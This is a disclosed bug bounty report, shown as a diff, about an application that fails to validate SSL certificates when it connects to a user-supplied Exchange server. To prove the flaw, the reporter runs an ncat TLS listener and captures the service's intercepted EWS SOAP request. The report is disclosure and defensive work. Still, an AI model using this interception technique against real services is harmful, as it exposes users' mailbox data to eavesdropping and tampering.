@@ -1,0 +1,78 @@
+ReportLink:https://hackerone.com/reports/16568
+WeaknessName:Cryptographic Issues - Generic
+Reporter:https://hackerone.com/pum
+ReportedTo:RelateIQ(relateiq)
+BountyAmount:200.0
+Severity:
+State:Closed
+DateOfDisclosure:25.08.2014 15:18:13
+
+Summary:
+
+Hi,
+
+in the register page a custom server can be used to define "where to connect to". Your system does not validate the SSL certificate of this host which makes it easy to tamper with the data your system do in behalf of the user.
+
+As only SSL links are allowed by the application the user could assume that the implementation is according to security best practice and would validate the certificate trustchain on connect. Additional "relateiq" might can guarantee the security of any connection under control, but the connection made over insecure networks could be tampered by anyone with access to this system.
+
+I have used ncat which generates a certificate on the fly to demonstrate the issue:
+
+ncat --ssl -p 443 -v -n -l
+Ncat: Version 6.46 ( http://nmap.org/ncat )
+Ncat: Generating a temporary 1024-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
+Ncat: SHA-1 fingerprint: 541F EC41 71A1 BDDC D7AE DA96 8950 5584 4BC5 E9D3
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 54.218.20.199.
+Ncat: Connection from 54.218.20.199:53669.
+POST / HTTP/1.1
+Content-Type: text/xml; charset=utf-8
+Accept: text/xml
+User-Agent: ExchangeServicesClient/15.00.0516.014
+Accept-Encoding: gzip,deflate
+Host: pum.no-ip.org
+X-ClientStatistics: MessageId=0ba62fc8-5767-4578-b789-0951dcf8e559,ResponseTime=389,SoapAction=FindItem`1;
+Content-Length: 1464
+Expect: 100-continue
+Connection: Keep-Alive
+
+<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Header>
+    <t:RequestServerVersion Version="Exchange2007_SP1" />
+    <t:TimeZoneContext>
+      <t:TimeZoneDefinition Id="Pacific Standard Time" />
+    </t:TimeZoneContext>
+  </soap:Header>
+  <soap:Body>
+    <m:FindFolder Traversal="Shallow">
+      <m:FolderShape>
+        <t:BaseShape>AllProperties</t:BaseShape>
+      </m:FolderShape>
+      <m:IndexedPageFolderView MaxEntriesReturned="1000" Offset="0" BasePoint="Beginning" />
+      <m:Restriction>
+        <t:And>
+          <t:IsEqualTo>
+            <t:ExtendedFieldURI PropertyTag="13825" PropertyType="Integer" />
+            <t:FieldURIOrConstant>
+              <t:Constant Value="2" />
+            </t:FieldURIOrConstant>
+          </t:IsEqualTo>
+          <t:IsEqualTo>
+            <t:FieldURI FieldURI="folder:DisplayName" />
+            <t:FieldURIOrConstant>
+              <t:Constant Value="allitems" />
+            </t:FieldURIOrConstant>
+          </t:IsEqualTo>
+        </t:And>
+      </m:Restriction>
+      <m:ParentFolderIds>
+        <t:DistinguishedFolderId Id="root" />
+      </m:ParentFolderIds>
+    </m:FindFolder>
+  </soap:Body>
+</soap:Envelope>
+
+cheers
+
+pUm
